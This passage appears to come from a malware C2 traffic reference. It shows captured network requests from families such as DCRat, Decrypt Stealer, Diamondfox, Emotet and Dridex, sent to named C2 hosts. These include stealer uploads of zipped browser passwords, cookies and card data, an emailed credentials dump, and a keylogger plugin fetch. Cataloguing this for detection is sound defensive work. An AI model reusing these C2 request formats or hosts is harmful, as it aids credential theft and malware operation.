request=YUhkcFpEMDVNREExT1dNek55MHhNekl3TFRReFlUUXRZalU0WkMweVlqYzFZVGs0TlRCa01tWW1ZMjl0Y0hWMFpYSnVZVzFsUFZWVFJWSXRVRU1tWVc5eWJtOTBQV1poYkhObEptbHVjM1JoYkd4bFpGSmhiVDB6TGpRNU9UWXhPU1p1WlhSR2NtRnRaWGR2Y21zeVBYUnlkV1VtYm1WMFJuSmhiV1YzYjNKck16MTBjblZsSm01bGRFWnlZVzFsZDI5eWF6TTFQWFJ5ZFdVbWJtVjBSbkpoYldWM2IzSnJORDEwY25WbEptRnVkR2wyYVhKMWN6MG1ZbTkwZG1WeWMybHZiajB5TGpJdU1DWm5jSFZPWVcxbFBXUkhPV3RpZHowOUptTndkVTVoYldVOVUxYzFNRnBYZDI5VmFXdG5VVEk1ZVZwVGFGVlVVMnRuWVZSVmRFNXFVWGROUTBKRVZVWlZaMUZEUVhsTWFtTjNVakJvTmlaaGNtTm9QV1ZFWnpJbWIzQmxjbWx1WjNONWMzUmxiVDFXTW14MVdrYzVNMk41UVROSlJrNXNZMjVhY0ZreVZXZFZSMFpxWVhsQmVDWnpjSEpsWVdSMFlXYzljR0ZzYVhkaA==

HTTP/1.1 200 OK
Date: Tue, 08 Oct 2019 11:25:25 GMT
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=hikrbr50pt7ggjr4rcbg40bvl6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 0
Content-Type: text/html; charset=UTF-8
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkrat.png "Darkrat")

#### DCRat
~~~
GET /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/56743785cf97084d3a49a8bf0956f2c744a4a3e0.php?data=active

HTTP/1.1
Host: domalo.online
Connection: Keep-Alive

GET /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn3b34w/212bad81b4208a2b412dfca05f1d9fa7.php?type=__ds_setdata&__ds_setdata_user=552b13e67562d7b564b8a0ac9f35c735d17c786b&__ds_setdata_ext=2dce65292845e5dbc41d772bf7f1866e&__ds_setdata_data=%3CSTR%3Esmss.exe%3CSTR%3Esvchost.exe%3CSTR%3Ewinlogon.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Ecsrss.exe%3CSTR%3Esvchost.exe%3CSTR%3Elsm.exe%3CSTR%3Eqemu-ga.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Eexplorer.exe%3CSTR%3ESearchProtocolHost.exe%3CSTR%3Elsass.exe%3CSTR%3Ectfmon.exe%3CSTR%3Edwm.exe%3CSTR%3Ecsrss.exe%3CSTR%3Esvchost.exe%3CSTR%3Eservices.exe%3CSTR%3EWmiPrvSE.exe%3CSTR%3Ewininit.exe%3CSTR%3Espoolsv.exe%3CSTR%3Efsdffc.exe%3CSTR%3ESearchIndexer.exe%3CSTR%3ESearchFilterHost.exe%3CSTR%3Ewindanr.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Etaskeng.exe%3CSTR%3ESystem.exe%3CSTR%3Esvchost.exe%3CSTR%3EIdle.exe 

HTTP/1.1
Host: domalo.online
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dcrat.png "DCRat")

#### Decrypt Stealer
~~~
POST /gate.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accepts-Language: en-us,en;q=0.5
Content-Type: multipart/form-data; boundary=---------------------------8d7f030923bcd86
Host: geroipanel.site
Content-Length: 1282596
Expect: 100-continue
Connection: Keep-Alive

-----------------------------8d7f030923bcd86
Content-Disposition: form-data; name="platform"

0
-----------------------------8d7f030923bcd86
Content-Disposition: form-data; name="profile"

0
-----------------------------8d7f030923bcd86
Content-Disposition: form-data; name="cccount"

0
-----------------------------8d7f030923bcd86
Content-Disposition: form-data; name="fcount"

0
-----------------------------8d7f030923bcd86
Content-Disposition: form-data; name="ccount"

0
-----------------------------8d7f030923bcd86
Content-Disposition: form-data; name="logs"; filename="bVYyP5uHP5ea.zip"
Content-Type: zip

PK.........l.P................Desktop Files\PK.........l.P............
...Passwords.txtPK.........l.P............0...Browsers\AutoFill\Unknown_Microsoft_Autofill.txtPK.........l.P............1...Browsers\Cards\Unknown_Microsoft_Credit_Cards.txtPK.........l.P............2...Browsers\Cookies\Default_Google_Chrome_Cookies.txtPK.........l.P............5...Browsers\Cookies\qldyz51w.default_Firefox_Cookies.txtPK.........l.Pz7q)............Browsers\Cookies\Unknown_Microsoft_Cookies.txt..1..0....	..........bA.Q....4.)....t.!.-..1.^.e..
{....E..%Q..G.P.F...t)...z.. Mp{.%C..........6...!.L....<...........F.>W.PD...07....>.T_@..........PK.........l.P	^..~...C...4...Browsers\Cookies\Unknown_Steam_htmlcache_Cookies.txt..A
.0.E...J.I.8..[. .N..8%.(xz........{<-....1..p...H2.8)....YD.w. ..92.,.r.{.........L..?...aP./O..;@.(N.X.!.....5...\...v?.PK........2.)M..*.....>.......FileZilla\filezilla.xml.Yko.:......?..I...E..4Iw...........D[l(R.);.....%9N....v,

...Skype\CURRENT.u..ts
..5..C..PK.........p.M............
...Skype\LOCKPK.........~)Ma...d.......	...Skype\LOG320..7.."]CS+S ..3.4P022.P.J--..KW.u..ts
.Q.I-K.II..	....!..VS.a.$........OWP64.............`...@B\.PK.........w.M`.6.........
...Skype\LOG.old.._K.0....)..Qko.$............v.1..h.....vC$+..-..;..pdI.I.a...RG..s.<a...m........n..`hGf.......F.K.{JQ..jA.\...a.S.. .,7............q_$.#..#./.^....7d...zKS<.R.&MI....6+\..H...S..kC..........Y..3IQC..T.s....].aN..p............+u........>L..l...Ij..:JN...4....PK.........v.M........5.......Skype\MANIFEST-000001.Z.....#.TNjYjNJ..SeIjyfq.s~nAbQbI~...3......9!..L,...l,..L./..D|]C...2sR........ .*..X.]Y.Z..X\.XP..X...........Z....
...H...h4..hN..........Q).nt0....
......2..h....;...	h&..7.A."......$>.I. .x.o@3I.......[..2I.h....;....h&..p..D>?...&.I.,Z..............A..Q.=zX...aZ.
.PK...........l.P..............................Desktop Files\PK...........l.P............
.............,...Passwords.txtPK...........l.P............0.............W...Browsers\AutoFill\Unknown_Microsoft_Autofill.txtPK...........l.P............1.................Browsers\Cards\Unknown_Microsoft_Credit_Cards.txtPK...........l.P............2.................Browsers\Cookies\Default_Google_Chrome_Cookies.txtPK...........l.P............5.............D...Browsers\Cookies\qldyz51w.default_Firefox_Cookies.txtPK...........l.Pz7q)..........................Browsers\Cookies\Unknown_Microsoft_Cookies.txtPK...........l.P	^..~...C...4.............y...Browsers\Cookies\Unknown_Steam_htmlcache_Cookies.txtPK..........2.)M..*.....>.................I...FileZilla\filezilla.xmlPK..........1.)M..p.L.....................N...FileZilla\layout.xmlPK...........l.P...E_6..j.....................Images\Screenshot.pngPK...........l.P..........................^C..Images\Webcam.pngPK...........l.Pr..........................C..OutLook\OutLook.txtPK...........q.M!$...r..i..................C..Skype\000005.ldbPK............)MpCM..[........................Skype\000017.logPK...........v.M.i...s..o.................1...Skype\000018.ldbPK...........p.M.r..........
............. ...Skype\CURRENTPK...........p.M............
.............Z...Skype\LOCKPK...........~)Ma...d.......	.................Skype\LOGPK...........w.M`.6.........
.............
...Skype\LOG.oldPK...........v.M........5.................=...Skype\MANIFEST-000001PK....................
-----------------------------8d7f030923bcd86--
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/decryptstealer1.png "Decrypt Stealer")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/decryptstealer2.png "Decrypt Stealer")

#### Delf Loader
~~~
GET /gate.php?serial=MTc4NS02NDU5LTQ2NDktMjQ0NA== HTTP/1.1
Content-Type: text/html
User-Agent: License
Host: ddhook.000webhostapp.com
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Mon, 07 Oct 2019 10:36:45 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Server: awex
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Request-ID: db10cf7bfe6a5d2a490182a808ccb458

11d091d035fb3bd27625c54c622a7e48


GET /check.php?serial=MTc4NS02NDU5LTQ2NDktMjQ0NA== HTTP/1.1
Content-Type: text/html
User-Agent: License
Host: ddhook.000webhostapp.com
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Mon, 07 Oct 2019 10:36:45 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Server: awex
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Request-ID: 4f25a2a515ae727693adbe820cf36edd

bff12793b8731a7f138e454a576ed1b5
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/delf.png "Delf Loader")

#### Diamondfox
~~~
GET /plugins/keylogger.p HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: exploit.rocks
Connection: Keep-Alive

I..Dw..o.............?."..zoh:.X4.O..CCUT:WV.HF7#.h......zE...:oj'vV..>X
..O..&?.x..a.s.l.A1....D.... loU....G^......l.:.....u.......8..Lq[..N`.]...n..Qy...Q.nn.........}eF.C...;N9.lI@P.f.}g.....V~.lf>)...T..@.(..c-V..yOOe.....6.L/.D...~...p.

GET /plugins/ftp.p HTTP/1.1
User-Agent: vb wininet
Host: exploit.rocks

HTTP/1.1 200 OK
Date: Mon, 22 Apr 2019 19:53:57 GMT
Server: Apache
Last-Modified: Sun, 19 Jul 2015 09:20:08 GMT
ETag: "15e0360-4000-51b36ed5c8200"
Accept-Ranges: bytes
Content-Length: 16384
Vary: Accept-Encoding,User-Agent
Content-Type: text/x-pascal

..)..7C4J=K9..H;.#W R!W%.*\/]/[,f.c.a.`.i.o.j.o.u.t.u.s.~
{	..x..l.~....,.
3.^_...3.c	w.x.?.{.q.QrF2.%V:.4Eym.{{\,S%.L:O.J<O=O;L.T.jL6.;D;.0G9.5n../Y'.,....T..#........................W.T.........e...................%.......................................AcG0B!G5.oL?O?K<V%C!Q6P#Y+O(Z9.....1W5M:L?M?K<V%..Q&x#Y+_hZ)O-e.d.e.c.n.k.i.h.q.w.r.w.}
|.}.{..u.q.v.s	{.x
y.}.b.g.g.d.m.i.n.k!S.R"Q.U-Z,O-_c\6E3A1F0C9K?H:I?M..................K.......................................k..............................+....................................@.Fu/..|P3I;O8J9O=U".t.e.ih.um.bC2F:L9M8L<J#W&R&P%Q,X(^/[*^.d.e.d.b.o.j.h.i.p.v.s.v
|	}.|.zs.v.v.u.|.x...z.b.a.`.d.k.n.n.m.T P&W#R&Z,Y-X,\*C7F2F0E1L8H>O;J>..........................................................................................................................rrrrw.3G6B6@5A<H8N?K:N"T!U T$R+_.Z.X.....@5A<H8N?K:N"T!U T$R+_.Z.X-Y.`.f.c.f.l.m.l.j.w.r.p.q.x.~.{
~r.q.p.t.{.~
~.}	d.`.g.b.j.i.h.l.S'V"V U!\(X._+Z.B4A5@4D2K?N:N8M9..........................................................................................................................squuq.2D1E0D4B;O>J>H=I$P V'S"V*\)](\7C4N=K9I>H;Q#W R!W%]*\/]/[,f.c.a.`.i.o.j.o.u.t.u.s.~
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/diamondfox.png "Diamondfox")

#### Dodgerblue
~~~
MAIL FROM: <e-sail@bojtai.xyz>
250 OK
RCPT TO: <e-sail@bojtai.xyz>
250 Accepted
DATA
354 Enter message, ending with "." on a line by itself
thread-index: AdeYjY9JWfNpH2aQRTCt4pdvmqBa0w==
Thread-Topic: Passwords:::JOHNS-PC\cep2solilJZGK
From: "abadia firmhearted" <e-sail@bojtai.xyz>
To: <e-sail@bojtai.xyz>
Subject: Passwords:::JOHNS-PC\cep2solilJZGK
Date: Mon, 23 Aug 2021 19:13:00 -0700
Message-ID: <870B54DC128A4D2CADAF814D7EBD6F47@SXQUR6787287963>
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="----=_NextPart_000_0000_01D79852.E3EBF170"
X-Mailer: Microsoft CDO for Windows 2000
Content-Class: urn:content-classes:message
Importance: normal
Priority: normal
X-MimeOLE: Produced By Microsoft MimeOLE V6.1.7601.17514

This is a multi-part message in MIME format.

------=_NextPart_000_0000_01D79852.E3EBF170
Content-Type: text/plain
Content-Transfer-Encoding: 7bit

Date: 2021-08-23 7:12:48 PM
System: Microsoft Windows NT 6.1.7601 Service Pack 1 (64 Bit)
Username: cep2solilJZGK
CompName: SXQUR6787287963
Windows Version: Microsoft Windows 7 Professional  - 64-bit
Antivirus: Not installed
CPU: Intel(R) Core(TM) i7-4770 CPU @ 3.40GHz
GPU: Standard VGA Graphics Adapter
RAM: 2004MB
Internal IP: 192.168.180.141
External IP: 104.244.72.168

Date: 2021-08-23 7:12:49 PM
System: Microsoft Windows NT 6.1.7601 Service Pack 1 (64 Bit)
Username: cep2solilJZGK
CompName: SXQUR6787287963
Windows Version: Microsoft Windows 7 Professional  - 64-bit
Antivirus: Not installed
CPU: Intel(R) Core(TM) i7-4770 CPU @ 3.40GHz
GPU: Standard VGA Graphics Adapter
RAM: 2004MB
Internal IP: 192.168.180.141
External IP: 104.244.72.168


------=_NextPart_000_0000_01D79852.E3EBF170
Content-Type: text/plain;
	name="credentials.txt"
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment;
	filename="credentials.txt"
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dodgerblue.png "DodgerBlue")

#### Donotgroup
~~~
POST /ze/volad/uzi HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Host: skillsnew.top
Content-Length: 1265
Cache-Control: no-cache

data=oowJkdfLibIHB1Y62ffb2Cf5imwjN2x/vp1AE/SF8E9/fX1cnZaC6Bg7jRETqi6iAsAVATepyhSETB+r2H2rYWEvvx/SmugiXvz27uz0yReYJAkt5CqsQ1ydb5UHNRcWeCnGPQpjtxUSdy2LbDj+BHjBdjchVAB23Cz4rjuoSeMKlJRQ9zvCOr97/MMALs/TboDUd+5fj/i2/APrZTfpizOy8v+poMBVcVMSRXHmpqpemivoTJEMmTx7y5tGBeY2YbMpVycCDNMyaJr7Xuh3Bng2MVZ5/OO2jvfqFXqwiMMZtiBEpRGjCKGYsUb/J2cyOMtemC3Sh71GkfSpI1sSV+1rKJzBILo6VHTGPK0Z12dxKVXEUCn4KTUTo/QVWTCnCyL7r+b0BIL+SVXjBOGtamQqja1Hq0Hrihoulr6qYy0jDKiyDa9n9BkSO3AJXsx5IkMf0qQvKzMW3iWvcRmILL1AXRCGgsxFCvAcDZ9GV5jM7E6rXEYQcYATyePeWJIMnNO6Tvyn/4qcywkEiKwt8Uoe6YCGaEwZjIsWfhFHTyJXj4KUY7nUuArbF1iz029U2QErLL5AiQUpHYeddGkjkvEPRnwahESDpYAwS6dVEKCn/n4CMJHEJqxHNRA2uSEewoCBYQb1lsKfdiMFZvD1kzKaxR7Oeluch5UFAGEhbJQMC6PsyVQ1nna6bn2S/0Bc4tKsMXfkr3YdfrPrXjUu4PlMRYPQYFUKTTpsFyAHXQ4a5jaiW9PmZOx1Iej9I0aFIiF8e1nVYgNXmMO3pYYbKxW0sn/MswbPNeNs3vQVFma15AM3y7eK8sPPizvYTsG6ld8rW0aUNqidEfpvck50hpUDKH0RdcfT9u+Kw5NZJ99ebBO8DMc1q4/8l9Tb887feKC1bvRVS2JYZKSyDaLJtC7VYZLjtczdqtu5Ayrh3q8kvWFxneIVI9jBuYi5YSkH+F7YQ/yuiDZwtGw6USUejEOuIpfa0PSIJQkDf01AqeKrXcNtKnmjv51Kmu1Go5u0v/zPgWDNG6w3DH0UhWrZxodJwLuKx6Qu66p3Vww/XJcQwVIK+86StKqMcCBH44nE11jRVZNi8L5Ru6WWvVqtktYlOJAJq9T/0Y3O7Onac3fDTThRSkme8mpvzCbkVhTW3jG9h+8aKt2H5rpgrb+4oSfCZQh+V+zDE54I2ODNytc79YOHTdrxYgEG3K2wS4udvyG6t66FA8RUJqmMc+ZPSGk9ZDH0hKpA5iWAr06IGlo=
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/donotgroup.png "Donotgroup")

#### Dridex (loader)
~~~
GET /function.php?3b3988df-c05b-4fca-93cc-8f82af0e3d2b HTTP/1.1
Host: masteronare.com
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 05 Nov 2019 20:32:12 GMT
Content-Type: application/octet-stream
Content-Length: 455830
Connection: keep-alive
Keep-Alive: timeout=60
Accept-Ranges: bytes
Content-Disposition: attachment; filename=5dc1dc4cd884c.pdf

7Y2FGZnZ2enZ2dnZydnZ2dhgYD3Z2e1B2dnZ2dnZ2dnZmdnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnYPdnZ2dnYDUUJQA3ZDdll5flVQdWN6B19hcF9HVE51QFRaDllUWnFDfnB5X1VaAkFTdHVebWR1TlNgA1BWYANQZXIOY35wBkFtcGJCc2YHfH12dnZ2dnZ2dnZ1XxxRchx9bV5RVWRgblkFB1tafQ5DdlsAXlVjBW5ZBQd0b0FxQ3J9XlFVZn1SD1oFQ1p9DkMCR1F0VWRGblkFB1tafQJDX31eUVVmfVIAYAdcWn0OQ3ZbAFtVZGRuWQUHdG9CeUN9fV5RVWZ9UgIFB1xafQ5DYlpbXVZ0YG5ZBQd2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZicmJ2dnJAdXV2dXJRenFTdnZ2dnZ2dnZ2dnNQdnZ+X3RAcn52dnRAdkB2dlh9cn
~~~
~~~
POST / HTTP/1.1
Host: 194.99.22.193
Content-Length: 3442
Connection: Close
Cache-Control: no-cache

..5......[,h?])moo..;.Y..
v..jq..........G.0vR...@ ..6tw..<.{It.y
#l.K..8....v...v......=.+.......Q..v..P5...y...uhTqR.
..v.QoM..o.I.l...>.....p.....Rt...............
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dridex.png "Dridex")

#### Dunihi
~~~
POST /is-ready HTTP/1.1
Accept: */*
Accept-Language: en-us
User-Agent: C4BA3647<|>USER-PC<|>admin<|>Microsoft Windows 7 Professional <|>+<|>undefined<|>false - 20/9/2019
Accept-Encoding: gzip, deflate
Host: 192.186.145.93:8885
Content-Length: 0
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Connection: close
Content-Type: text/html
Server: Indy/9.0.18
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dunihi.png "Dunihi")

#### Emotet
~~~
POST /mult/tlb/ HTTP/1.1
Referer: http://69.162.169.173/mult/tlb/
Content-Type: application/x-www-form-urlencoded
DNT: 1
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: 69.162.169.173:8080
Content-Length: 468
Connection: Keep-Alive
Cache-Control: no-cache

5Grps=L1sIwg4a7XWGwPpN9LOBzMiBXsZTP33ixo%2FUspmgBLoaYr0K7KnwvoUER9%2B5NzIxpTHgpSTeVRZMm92wSA%2Ff9pG66uhR%2FX%2BGREn%2BVIvlr3LiYQupDVsdexmgD%2FSXdTJ%2FxXNSo5Q52S4HvI9eLtM9s0arCw%2FNNEZlkzp6e8omxU3854YNNNUcAV54N30rgISrXlxvWJz9TP%2FelEcMxMf3hzv91K1Uz8H2KWzWjV2x78pmAG9HGdkFGLaOq6Tqp1LH6Uc7c1gzmZ3Cht2T4cKg06DPDTHkXYj%2F7uCMWAFMO%2FS4QlZl1XKi8MmZck0JAmxsZdGcmIkQoqq5DzFCio6fUAgvqUN3g1%2BP5eXYeZpGu1xIzbWLRG9Wtt2vUOjz4ezl6Z%2B2peN1LKWN%2F8V0CLjxQHhXSu9YZP4g3NIdJ5qofLmM0ipT

HTTP/1.1 200 OK
Server: nginx
Date: Mon, 07 Oct 2019 13:38:33 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 148
Connection: keep-alive

.^ta.I..Z .._AJ*..=._...5-...F.L{>...`.c.....~.|.h...@.E...2.Z|U..W..M....b......X.FA....x.....\.j?/C......{pi.b....Cz......>D..yQ........G.q...4?..
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/emotet-1.png "Emotet")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/emotet-2.png "Emotet")

#### EngrWiz
~~~
POST /b.php?79 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: litespidchk.tk
Content-Length: 970
Expect: 100-continue

main1=bNzJOjMPRRDJ2ylFA1SCAY7GEg0j4ROaetEMhuN1ObuzyJ%2bYF2etM938iapA5dT909gUM9ORgU5n0fMY%2fFKhRr7QWxNopqIoNFeQWjzRaqyGtXxs5NLSLHAitCOyzowy&back=TnpNNU5DMUJNamRETFRnMk9VVXRRVEpEUXkwM016WXpMVE00TXprdFFqTXlNaTA0TXpCRE96VHA%3d&main3=NTQ%3d&main2=Gr4YoYDefbNT%2ftg2inQcbufFo%2bzbKZmaqrttK%2fVrQXhuPh9fr66Kem9y7I%2bsUHvrnrmSNogQl3Lk%2bMvr9p8aGKsZrSODSSTbYPy3Osy5WF8reN7lc6V%2fUtARI%2bizcbulBVnqc3zLaKOvIEl8eDqq6mbY5GwzG3Mie6NW5W1zLG3hEmABLyZkbQdJhhkYhMpQbxkuIhbcIzdTSm9%2b4xC8gb9v%2bnRligpWZowXrb56VqPC9KrPYuBnIqHH4xj5Pwgyl1g8kDTLJ2qMfGIAZeFv4YuSM2Xuza%2bMN7Zpi8Uuxuvq1D9wsc7b8V4POHZ9Rn34alELER2wAdRQ7PiNI2sglwH97JsZoopUyW28YJOAFWJ6kDPKXKIpiUifcye%2b4wplt9fV3OycDqbt5gAbobpA7qNTgyQfAUXYrXMDRNhNQi4%2ffbWCt2%2fd%2bZd%2fxe9k55wQhhLbdy%2bn1wLkZz4NIGssu9vJECynDGwT%2f4MlFIwD5kV0hD%2bjjSTHecWF23%2f0Wi%2fCS7msiLCQ3SukIpWskjRPNPZ8TDvlYctblEeLUZWZDobBQgsdLUzCekYEsX4toOXF2NV69a3ayO0e8etiw4LPRrvbBQiAmU5FZYESOeWkaw71mxzjOxeHFPQtKn2%2fWwdxBpl05y5BtZSnOzfc2wCELk4iYCl20OE5OtjyGvhtAes%3dHTTP/1.1 200 OK
Date: Wed, 24 Jul 2019 09:11:10 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: __cfduid=d6917d65789c5d5e772089d4fe53cd4181563959469; expires=Thu, 23-Jul-20 09:11:09 GMT; path=/; domain=.litespidchk.tk; HttpOnly
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Request-ID: 571e4da59d69406a9d967ee31ad5fae4
Server: cloudflare
CF-RAY: 4fb4c3dd683ccaf4-ARN
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/engrwiz.png "EngrWiz")

#### Evilpony
Follow tcp stream, not http stream in wireshark
~~~
POST /d2/about.php HTTP/1.0
Host: spausence.com
Accept-Encoding: identity, *;q=0
Accept-Language: en-US
Content-Length: 337
Content-Type: application/octet-stream
Connection: close
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Content-Encoding: binary

...Q..8.T.f5...~....I..%..`qq...q.^.i.u..v.|34.../t....w....u.}........
6.......
...2..T(.Z.X/..A....55.....>$l
..uE.-..p..
..omvs.S.uYa.Y...............Ezv...B.OM_.X.pg..1...6..}kN..U..%...2.:.H.E......9.k.-.5sD..@.*
	k~........y.s.....@.L+X....wK.O11a.q.$.zd.A...hd9........,. ..(..tP..$.|rS....I.8"
..X!@.	....4N...x.<.......!m~O_.T`.HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Thu, 03 Oct 2019 17:18:05 GMT
Content-Type: text/html
Connection: close
X-Powered-By: PHP/5.4.45

I6.$...Z,....   
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/evilpony.png "Evilpony")

#### Evrial Stealer
~~~
HTTP/1.1 100 Continue

POST /files/upload.php?user=XakFor.Net&hwid=EEEB5D54788042A7B542739BBC26CF4B HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------8d7830f073b0ab4
Host: softfare.zzz.com.ua
Content-Length: 58292
Expect: 100-continue
Connection: Keep-Alive

-----------------------8d7830f073b0ab4
Content-Disposition: form-data; name="file"; filename="sega2laj1y4.zip"
Content-Type: application/octet-stream

PK........W..O........M.......desktop.jpg..u\T].=:.4b. ....t."14CI..AH..H( #9t#0.. ) 
.!.J7.
...}.}.....?.....9s....a?.Y.z.yO..L...*!.`xxx.{.?..(L.FBDDLt.................
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/evrial.png "Evrial")

#### Exilerat
~~~
POST /test/u HTTP/1.1
Cache-Control: no-store
Connection: Keep-Alive
Pragma: no-store
Content-Type: multipart/form-data; boundary=--71h2ll4i66hhbl
Accept: text/*,application/*
Accept-Language: en-US,en
Host: 27.126.188.212
Content-Length: 368

--71h2ll4i66hhbl
Content-Disposition:form-data;name="x.bin"
Content-Type:application/octect-stream

cjESYTqBEdGqEeIxETEREaKiooqikgm6irKKgqKigimigikRMysrKz8jIyMrqhHi
MRExERGioqKKopIJuoqyioKiooIpooIpETMbIyMjibkJsUqhOTsLIyMjKABIaFAD
GyMjI6JSolKiUqIL2yMjI4qySoqCSqKiSoIpSqKCSikRquqyUqqS4lKqoqJS4qob
kyMjI5loUABYmLgimiKQCLDyklKqUpqSoqpjBAMjIw==
--71h2ll4i66hhbl--
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/exilerat.png "Exilerat")

#### Expiro
~~~
POST dovamnabihede.ws HTTP/1.1
User-Agent: Mozilla/4.0 (Compatible; msie 44; NT6.1.7601-90376708.ENU.3DA43F52-83C788-FF5FFC-15DD1711; .NET CLR 00000000/00000000)
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/expiro.png "Expiro")

#### Filecoder.STOP
~~~
GET /As73yhsyU34578hxxx/SDf565g/get.php?pid=2485E9F082250E269EA0EF635E0D382D&first=true HTTP/1.1
User-Agent: Microsoft Internet Explorer
Host: ring1.ug

HTTP/1.1 200 OK
Date: Fri, 25 Oct 2019 13:26:11 GMT
Server: Apache/2.4.37 (Win64) PHP/5.6.40
X-Powered-By: PHP/5.6.40
Content-Length: 562
Connection: close
Content-Type: text/html; charset=UTF-8

{"public_key":"-----BEGIN&#160;PUBLIC&#160;KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5pjgODTtZORmS4jeVWQV\\nvs71Fz\/NH7IWyR7an0L+rLo1S7Jrqn64J8LXlT\/1eiDN87tYle5AlB4\/vmf4Uo98\\ncMG\/E+NbFLtyRyxTq4RmaNDjyvTPIXbBl+cMU4yIwBKT89D8tuD6PhdfVVjMx71l\\niEPtuNb5pD38EYGv\/3+Yrwvg3sU1+aiIWdZgPX3ieFxAL3ZZkvlr5\/XeNpKqGAiT\\n6YBjLZg7R\/5j5Knhex+gKUR2Gkh2CG7mWqjcaNUK9Hzkgk3\/UmqopxokpSTkHmUT\\nSlN5mKAg438TmIUz4MCnnieexOtpcg7Fmn2wPObgdIG3OXK5yfxxExa+TBDTbCFc\\ngQIDAQAB\\n-----END&#160;PUBLIC&#160;KEY-----\\n","id":"Em9SPAhlG3hXHt713xEY92niynachhsXeWwCv6cB"}
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/stopfilecoder.png "Expiro")


#### Fin7 JS Backdoor
~~~
POST /pictures/delete?type=name HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/50.0
Content-Length: 326
Host: moviedvdpower.com

lwirwavfynacqo=PKWFG%04S@XZ%16l%04%0E%00%02%00f%09%02%06%09%1EAC%04%0D%02%05%1FKVTK%5DG%0AX%08%07%0F%0D%00W%05%5B%5DQ%05%0D%0AV%0F%0B%5B%0B%03%0E%0FP%03%0B%01%06%0E%0C%5D%06V%1FLZZ%5C%05%02%05%09%08%03%07%1FMZS%04%0E%01%05%1FQW%0A%0C%0A%09%02%0D%02%03%07%03%0Cr%0Dx%7C%09%05%08gfD%5CJ%1Egz%1ECV%5E%5Dl%5E%5D%05%5DRN%26_%267983

HTTP/1.1 200 OK
